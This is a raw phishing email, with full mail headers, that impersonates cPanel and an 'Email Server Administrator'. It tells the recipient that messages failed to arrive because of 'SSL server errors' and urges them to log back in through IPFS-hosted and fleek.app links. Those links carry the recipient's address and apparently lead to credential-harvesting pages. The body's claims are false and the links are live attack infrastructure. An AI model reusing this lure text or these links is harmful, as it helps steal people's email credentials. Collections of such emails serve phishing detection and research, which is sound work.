@@ -1,0 +1,159 @@
+Return-Path: sub1@kartek.co.kr
+Delivered-To: jose@monkey.org
+X-FDA: 83259554826.21.3EB6740
+Received: from narrowdirection.aeza.network (unknown [213.176.95.175])
+	by imf12.b.hostedemail.com (Postfix) with ESMTP id A5B9DA0007
+	for <jose@monkey.org>; Tue, 25 Mar 2025 09:31:11 +0000 (UTC)
+Authentication-Results: imf12.b.hostedemail.com;
+	dkim=none;
+	dmarc=none;
+	spf=softfail (imf12.b.hostedemail.com: 213.176.95.175 is neither permitted nor denied by domain of sub1@kartek.co.kr) smtp.mailfrom=sub1@kartek.co.kr
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1742895072;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:content-transfer-encoding:in-reply-to:
+	 references; bh=g9LkEKmWCjRFQ6o7HmwK3kC9+3XManfBwWBlDpVntlU=;
+	b=2dc41EUMqiZGurD/wKTBOAjih1kUqMrf7+AE3uuaMWLMz5T0vIFY2CByBqHg1FUfh8KFNz
+	a+NJwwwjQkyf/m2H6ABaCbyk95Ey5CGZ18hAjKsWFyMD+mmJCxlLBPFue5RUP4UHaxStx/
+	dTa6f+f/BlFmcRtnLHBnmpIXaBOsJXU=
+ARC-Authentication-Results: i=1;
+	imf12.b.hostedemail.com;
+	dkim=none;
+	dmarc=none;
+	spf=softfail (imf12.b.hostedemail.com: 213.176.95.175 is neither permitted nor denied by domain of sub1@kartek.co.kr) smtp.mailfrom=sub1@kartek.co.kr
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1742895072; a=rsa-sha256;
+	cv=none;
+	b=0QE4NgMw2EYxI/SDTGW4N0M9uxHVUJcQWZIOpVLpPBWRYrdNHePHr3RVY6kpABKAbFYwcx
+	MXuuuhe+0EieBr1BbEpllOZECLllIGqGg7LqRIMPvTtewcYMt2Joy6H183Np9hwuBDpCqa
+	+20jbk/L/3m9mz2qky6BkVvgorB/Arg=
+Received: from PAPICHULO-BROOKS (localhost [127.0.0.1])
+	by narrowdirection.aeza.network (Postfix) with ESMTP id AA95A420829
+	for <jose@monkey.org>; Tue, 25 Mar 2025 10:30:20 +0100 (CET)
+From: "monkey.org" <sub1@kartek.co.kr>
+Subject: Action required: delivery error code: (dT2309)
+To: <jose@monkey.org>
+Content-Type: multipart/alternative; boundary="rx56om7i4e4Unqtblrra=_XpwerjuVDccc"
+MIME-Version: 1.0
+Date: Tue, 25 Mar 2025 10:30:21 +0100
+Message-Id: <25202025033010DDE399D669$E8881BCAC2@kartek.co.kr>
+X-Rspamd-Server: rspam01
+X-Rspamd-Queue-Id: A5B9DA0007
+X-Spam-Status: Yes, score=21.70
+X-Stat-Signature: 6wkqi4pqz6o9hehnq8xn4w7k3jre8u8g
+X-Rspam-User: 
+X-HE-Tag: 1742895071-530325
+X-HE-Meta: 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
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 109
+
+This is a multi-part message in MIME format
+
+--rx56om7i4e4Unqtblrra=_XpwerjuVDccc
+Content-Type: text/plain; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+
+Due to SSL server errors, some emails are failing to reach your inbox.=
+
+
+To fix this, You need to complete the following operations as soon as =
+possible (Two-way Authentication)
+
+please refresh your email server using the session information provide=
+d to authenticate your account
+
+Refresh Email Server https://ipfs.io/ipfs/bafybeidchq7ubnonynhtiexafm7=
+74ktkyizzpct2iczsxilsmfx2mv3bom/sdnffjgjgjgjgjwhxhwdbefbenfbjbkefkjefk=
+egjkwewj2wjdwnkfwfwf.html#jose@monkey.org
+
+This email is system generated. Do not reply to this email.
+
+Email Server Administrator
+
+Powered by=20
+
+HTMLemail http://htmlemail.io/
+
+=2E
+Copyright =A92025 All Rights Reserved.
+
+--rx56om7i4e4Unqtblrra=_XpwerjuVDccc
+Content-Type: text/html; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+
+<html><head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-=
+8859-1">
+  <META name=3D"viewport" content=3D"width=3Ddevice-width, initial-sca=
+le=3D1"> <META name=3D"format-detection" content=3D"telephone=3Dno"><t=
+itle>Action required: delivery error code: (dT2309)</title>
+ </head>
+ <body> <P><table style=3D"FONT-SIZE: 12px; MAX-WIDTH: 650px; BORDER-T=
+OP: rgb(221,221,221) 1px solid; FONT-FAMILY: 'Microsoft YaHei'; BORDER=
+-RIGHT: rgb(221,221,221) 1px solid; WIDTH: 651px; WHITE-SPACE: normal;=
+ WORD-SPACING: 0px; BORDER-COLLAPSE: collapse; TABLE-LAYOUT: fixed; BO=
+RDER-BOTTOM: rgb(221,221,221) 1px solid; TEXT-TRANSFORM: none; FONT-WE=
+IGHT: 400; COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-STYLE: normal;=
+ PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-SPACING: 0px; BORDER-LEFT=
+: rgb(221,221,221) 1px solid; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px; PADD=
+ING-RIGHT: 0px; TEXT-INDENT: 0px; font-variant-ligatures: normal; font=
+-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration=
+-thickness: initial; text-decoration-style: initial; text-decoration-c=
+olor: initial" height=3D344 cellSpacing=3D0 cellPadding=3D0 align=3Dce=
+nter bgColor=3D#ffffff> <tr><td style=3D"FONT-SIZE: 16px; PADDING-BOTT=
+OM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 62px; MARGIN: 0px; LINE-HEIGH=
+T: 24px; PADDING-RIGHT: 62px"><FONT size=3D3 face=3DArial> <P style=3D=
+"MARGIN-BOTTOM: 0pt; unicode-bidi: embed; MARGIN-TOP: 7.68pt; DIRECTIO=
+N: ltr; MARGIN-LEFT: 0.38in"><FONT color=3D#ff6600 size=3D7 face=3DTah=
+oma><B>cPanel</B></FONT><SPAN style=3D"COLOR: rgb(255,102,0)"><FONT si=
+ze=3D7><FONT face=3DVerdana>&nbsp;</FONT>&nbsp;</FONT></SPAN></P>&nbsp=
+; <P style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px=
+; MARGIN: 0px; PADDING-RIGHT: 0px"><B><FONT color=3D#666666 size=3D2 f=
+ace=3DVerdana>T</FONT></B><B><FONT color=3D#666666 size=3D2 face=3DVer=
+dana>&nbsp;wo&nbsp;(</FONT><FONT color=3D#ff0000 size=3D2 face=3DVerda=
+na>2</FONT><FONT color=3D#666666 size=3D2 face=3DVerdana>)&nbsp;&nbsp;=
+new messages were sent to you, but they were not correctly delivered t=
+o your&nbsp;&nbsp;mailbox,&nbsp;</FONT>&nbsp;<FONT color=3D#666666 siz=
+e=3D2 face=3DVerdana>due to&nbsp;</FONT><FONT color=3D#ff6600 size=3D2=
+ face=3DVerdana>cPanel</FONT>&nbsp;<FONT color=3D#666666 size=3D2 face=
+=3DVerdana>&nbsp;&nbsp;having a new administration policy that affects=
+ incoming messages&nbsp;in&nbsp;mailboxes during the process.&nbsp;</F=
+ONT></B></p><p style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING=
+-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px"><B><FONT color=3D#666666 =
+size=3D2 face=3DVerdana>You can&nbsp;retrieve&nbsp;&nbsp;&nbsp;the&nbs=
+p;&nbsp;messages in a timely manner to avoid rejection. The system tak=
+es&nbsp;</FONT><FONT color=3D#808000 size=3D2 face=3DVerdana>72</FONT>=
+<FONT color=3D#666666 size=3D2 face=3DVerdana>&nbsp;&nbsp;hours to res=
+tore the emails. OR&nbsp; &nbsp;</FONT></B></p><p style=3D"PADDING-BOT=
+TOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RI=
+GHT: 0px"><FONT color=3D#ffffff face=3DVerdana><SPAN style=3D"BACKGROU=
+ND-COLOR: rgb(0,153,255)"><A style=3D"COLOR: rgb(34,34,34)" href=3D"ht=
+tps://ipfs.io/ipfs/bafybeihfup37yw23zn5tnpkdl5vb6hy26oyx7i25qgbjecbl6i=
+ieuakefq/pages.html/#jose@monkey.org" rel=3Dnoreferrer target=3D_blank=
+ data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://hollow=
+-death-full.on-fleek.app/webmail.html/%23%5BEMail%5D&amp;source=3Dgmai=
+l&amp;ust=3D1742876073822000&amp;usg=3DAOvVaw2bjsB8m3pQUyecJoTsGa0u"><=
+FONT color=3D#ffffff size=3D3>&gt;&gt;&gt; Please log back in here to =
+retrieve your messages</FONT></A></SPAN></FONT></P>&nbsp; <P style=3D"=
+PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px;=
+ PADDING-RIGHT: 0px"><B>&nbsp;<FONT color=3D#666666 size=3D2 face=3DVe=
+rdana>If the messages are not&nbsp;&nbsp;retrieved in time, the mails =
+will be rejected.<BR>&nbsp;Thanks,<BR><BR></FONT></B></p><p style=3D"P=
+ADDING-BOTTOM: 0px; TEXT-ALIGN: justify; PADDING-TOP: 0px; PADDING-LEF=
+T: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">&nbsp;</P></FONT></TD></tr><t=
+r><td style=3D"FONT-SIZE: 16px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px;=
+ PADDING-LEFT: 62px; MARGIN: 0px; LINE-HEIGHT: 24px; PADDING-RIGHT: 62=
+px"><FONT size=3D3 face=3DArial> <P style=3D"PADDING-BOTTOM: 0px; TEXT=
+-ALIGN: center; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADD=
+ING-RIGHT: 0px"><FONT size=3D2 face=3D"Segoe UI">&copy;2025 cPanel, L.=
+L.C.</FONT></P></FONT></TD></TR></TABLE></P></body>
+ </html>
+
+--rx56om7i4e4Unqtblrra=_XpwerjuVDccc--
+
